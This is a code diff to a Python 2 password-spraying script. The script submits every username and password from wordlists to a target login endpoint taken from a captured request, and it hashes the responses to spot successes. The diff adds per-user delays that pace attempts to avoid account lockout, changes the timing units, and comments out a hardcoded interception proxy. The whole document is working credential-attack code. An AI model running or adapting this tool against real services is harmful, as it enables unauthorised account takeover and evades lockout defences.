@@ -15,7 +15,8 @@ import hashlib
 parser = argparse.ArgumentParser()
 
 parser.add_argument("--shotgun", action="store_true", help="Spray all users with no pause.")
-parser.add_argument("--duration", default="120", help="Total spray duration in minutes. Default is 120 minutes.")
+#parser.add_argument("--proxy", help="Specify proxy. Format 'http://127.0.0.1:8080'")
+parser.add_argument("--duration", default="7200", help="Total spray duration in seconds. Default is 7200 seconds.")
 parser.add_argument("--request", default="request.txt", help="Name of request file. Default is 'request.txt'.")
 parser.add_argument("--usernames", default="usernames.txt", help="Name of usernames file. Default is 'usernames.txt'.")
 parser.add_argument("--passwords", default="passwords.txt", help="Name of passwords file. Default is 'passwords.txt'.")
@@ -23,15 +24,14 @@ parser.add_argument("--passwords", default="passwords.txt", help="Name of passwo
 args = parser.parse_args()
 
 # Supporting variables/work
-proxies = {'http' : 'http://10.10.110.100:8080'}
-sleepTimeMinutes = int(round(float(args.duration)))
-sleepTimeSeconds = int(round(sleepTimeMinutes*60))
+# proxies = {'http' : 'http://10.10.110.100:8080'}
+sleepTimeSeconds = int(args.duration)
 if not os.path.exists("logs"):
     os.makedirs("logs")
 
 # Ensure spray time is appropriate
 if raw_input("You will be spraying every " \
-        + str(sleepTimeMinutes) + " minutes. Is that cool? (y/N) ").lower() != 'y':
+        + str(sleepTimeSeconds) + " seconds. Is that cool? (y/N) ").lower() != 'y':
     sys.exit("Change spray time.")
 
 ################################################################################
@@ -84,7 +84,8 @@ for password in passwordsList:
         # Attempt login
         print "Attemping " + username + ':' + password
         url = "http://" + headerDict["Host"] + endPoint
-        response = requests.post(url=url, headers=headerDict, data=dataDict, proxies=proxies, verify=False)
+        #response = requests.post(url=url, headers=headerDict, data=dataDict, proxies=proxies, verify=False)
+        response = requests.post(url=url, headers=headerDict, data=dataDict, verify=False)
 
         # Create hash of response
         checksummer = hashlib.md5()
@@ -92,6 +93,11 @@ for password in passwordsList:
 
         # Store hash of response. Chance of collision but very minimal.
         responseDict[checksummer.hexdigest()] = response
+
+        if(not args.shotgun):
+            sleepTime = float(sleepTimeSeconds)/float(len(usernamesList))
+            print "Sleeping for: " + str(sleepTime) + " seconds"
+            time.sleep(sleepTime)
 
 #    meaningFulResponses = extractMeaningfulResponses(responseDict)
 
@@ -133,4 +139,5 @@ for password in passwordsList:
 
         fileOut.close()
 
-    time.sleep(sleepTimeSeconds)
+    if(args.shotgun):
+        time.sleep(sleepTimeSeconds)
